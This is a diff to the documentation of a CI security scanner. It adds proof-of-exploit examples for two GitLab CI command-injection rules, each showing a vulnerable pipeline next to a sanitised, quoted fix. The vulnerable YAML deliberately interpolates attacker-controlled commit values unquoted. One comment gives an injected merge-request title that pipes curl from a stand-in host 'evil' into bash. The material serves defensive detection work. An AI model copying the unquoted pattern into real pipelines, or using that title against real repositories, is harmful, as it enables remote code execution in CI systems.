@@ -4329,6 +4329,43 @@ v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``inclu
 
 - If the producer job runs a sanitiser between the tainted source interpolation and the dotenv write (``echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 ' > taint.env``), the consumer is no longer exploitable but TAINT-004 still fires. Suppress via ignore-file scoped to the consumer job's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an ``extract`` job writes an untrusted
+# source (``$CI_COMMIT_MESSAGE``) into a dotenv report
+# artifact. GitLab automatically loads dotenv reports
+# as env vars in dependent jobs; the consumer job then
+# inlines the value into a shell command unquoted, and
+# any metacharacters in the source execute there.
+extract:
+  script:
+    - echo "MSG=$CI_COMMIT_MESSAGE" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message $MSG
+
+# Safe: sanitise at the producer before writing the
+# dotenv file, and quote at the consumer. The cleaned
+# value is safe to inline; the consumer's env binding
+# is properly quoted.
+extract:
+  script:
+    - clean=$(echo "$CI_COMMIT_MESSAGE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "MSG=$clean" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message "$MSG"
+```
+
 **Source:** [`TAINT-004`](../providers/gitlab.md#taint-004) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `TAINT-005`: Untrusted input flows across steps via ``buildkite-agent meta-data`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-005 }
@@ -4571,6 +4608,41 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 **Known false positives.**
 
 - If the consuming job sanitises the inherited variable before referencing it (``CLEAN=$(echo "$TITLE" | tr -dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still fires on the original ``$TITLE`` reference even though the sanitised value is what reaches the shell. Suppress via ignore-file scoped to the consuming job's name when the sanitiser is audited and load-bearing.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: hidden template ``.base`` interpolates
+# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
+# title) into a ``variables:`` block. Job ``build``
+# extends ``.base`` and references ``$TITLE`` unquoted
+# in a shell command. A MR titled ``feat;curl
+# evil|bash;`` executes the injected curl. GL-002
+# misses this because it skips hidden-job templates.
+.base:
+  variables:
+    TITLE: $CI_COMMIT_TITLE
+build:
+  extends: .base
+  script:
+    - echo Building $TITLE
+    - ./generate-notes --title $TITLE
+
+# Safe: receive the source value at the consumer (not
+# the template), sanitise it once, and reference the
+# cleaned variable quoted from then on. The hidden
+# template no longer carries any attacker-controllable
+# variable.
+.base:
+  before_script:
+    - echo "Job $CI_JOB_NAME starting"
+build:
+  extends: .base
+  script:
+    - clean=$(echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "Building $clean"
+    - ./generate-notes --title "$clean"
+```
 
 **Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).
 
